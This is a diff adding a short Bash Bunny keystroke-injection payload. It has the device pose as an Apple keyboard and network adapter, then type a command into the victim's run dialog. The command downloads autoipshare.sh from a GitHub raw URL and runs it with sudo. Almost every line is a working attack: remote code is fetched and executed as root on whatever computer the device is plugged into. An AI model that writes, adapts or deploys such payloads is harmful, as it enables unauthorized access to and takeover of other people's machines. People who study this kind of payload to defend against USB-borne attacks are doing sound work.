@@ -1,0 +1,9 @@
+LED R
+ATTACKMODE HID VID_0X05AC PID_0X021E ECM_ETHERNET
+DELAY 1000
+LED R B G
+QUACK GUI r
+DELAY 1000
+QUACK STRING 'if [ -f autoipshare.sh ]; then sudo bash autoipshare.sh ; else wget https://raw.githubusercontent.com/TheDragonkeeper/bashbunny-payloads/master/payloads/library/Linux-AutoShareIP/autoipshare.sh ; sudo bash autoipshare.sh ; fi'
+QUACK ENTER
+LED G
